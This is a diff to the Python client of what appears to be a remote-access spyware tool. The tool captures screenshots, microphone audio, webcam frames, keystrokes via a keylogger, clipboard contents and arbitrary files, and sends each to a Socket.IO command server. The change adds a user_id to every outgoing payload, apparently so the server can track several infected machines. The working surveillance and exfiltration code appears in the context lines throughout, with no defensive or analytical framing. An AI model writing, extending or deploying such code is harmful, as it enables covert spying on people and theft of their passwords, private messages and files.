@@ -12,7 +12,7 @@ import pyperclip
 from PIL import Image
 
 
-def take_and_send_screenshot(sio):
+def take_and_send_screenshot(sio, user_id):
     try:
         screenshot = pyautogui.screenshot()
         screenshot_bytes_io = io.BytesIO()
@@ -20,7 +20,7 @@ def take_and_send_screenshot(sio):
         screenshot_bytes_io.seek(0)
         resized_screenshot = resize_image(screenshot_bytes_io)
         screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()
-        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
+        sio.emit('screenshot_response', {'screenshot': screenshot_encoded, 'user_id': user_id})
         print("Capture d'écran envoyée")
     except Exception as e:
         print(f"Échec de la capture d'écran: {e}")
@@ -37,7 +37,7 @@ def resize_image(image_bytes_io, base_width=1300):
     return img_byte_arr
 
 
-def record_and_send_audio(duration=10, sio=None):
+def record_and_send_audio(duration=10, sio=None, user_id=None):
     try:
         audio = pyaudio.PyAudio()
         stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
@@ -55,7 +55,7 @@ def record_and_send_audio(duration=10, sio=None):
 
         audio_io.seek(0)
         audio_encoded = base64.b64encode(audio_io.read()).decode()
-        sio.emit('audio_response', {'audio': audio_encoded})
+        sio.emit('audio_response', {'audio': audio_encoded, 'user_id': user_id})
         print("Audio envoyé")
     except Exception as e:
         print(f"Échec de l'enregistrement audio: {e}")
@@ -70,7 +70,7 @@ def save_wave_file(file_io, audio_data):
         wave_file.writeframes(audio_data)
 
 
-def record_and_send_keyboard_log(duration=10, sio=None):
+def record_and_send_keyboard_log(duration=10, sio=None, user_id=None):
     try:
         print("Enregistrement du keylogger en cours...")
         keyboard.start_recording()
@@ -78,19 +78,19 @@ def record_and_send_keyboard_log(duration=10, sio=None):
         keyboard_events = keyboard.stop_recording()
         keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
         keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
-        sio.emit('keyboard_response', {'keyboard_log': keyboard_log})
+        sio.emit('keyboard_response', {'keyboard_log': keyboard_log, 'user_id': user_id})
         print("Keylogger envoyé")
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
 
 
-def get_clipboard_content(sio=None):
+def get_clipboard_content(sio=None, user_id=None):
     try:
         print("Récupération du clipboard...")
         clipboard_content = pyperclip.paste()
         if clipboard_content and sio:
-            sio.emit('clipboard_response', {'clipboard_content': clipboard_content})
+            sio.emit('clipboard_response', {'clipboard_content': clipboard_content, 'user_id': user_id})
             print("Contenu du clipboard envoyé au serveur.")
         else:
             print("Aucun contenu trouvé dans le clipboard ou connexion au serveur Socket.IO manquante.")
@@ -125,13 +125,14 @@ def gen_frames(sio):
         cv2.destroyAllWindows()
 
 
-def download_file(file_path, sio):
+def download_file(file_path, sio, user_id):
     try:
         if os.path.exists(file_path):
             with open(file_path, 'rb') as file:
                 file_data = file.read()
                 file_encoded = base64.b64encode(file_data).decode()
-                sio.emit('file_response', {'file': file_encoded, 'file_name': os.path.basename(file_path)})
+                sio.emit('file_response',
+                         {'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                 print("Fichier envoyé")
         else:
             print("Fichier introuvable")
